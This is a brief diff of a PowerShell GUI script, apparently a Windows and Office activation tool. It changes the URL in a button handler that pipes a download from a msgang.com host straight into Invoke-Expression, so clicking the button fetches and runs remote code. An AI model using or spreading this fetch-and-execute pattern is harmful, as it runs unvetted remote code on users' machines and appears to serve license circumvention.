@@ -259,7 +259,7 @@ function OfficeActivation {
 # Event handlers when click buttons 
     $button.Add_Click({WindowsActivation})
     $button1.Add_Click({OfficeActivation})
-    $button2.Add_Click({Invoke-RestMethod https://msgang.com/install | Invoke-Expression})
+    $button2.Add_Click({Invoke-RestMethod install.msgang.com | Invoke-Expression})
 
 # Show the form
     $null = $Form.ShowDialog()  
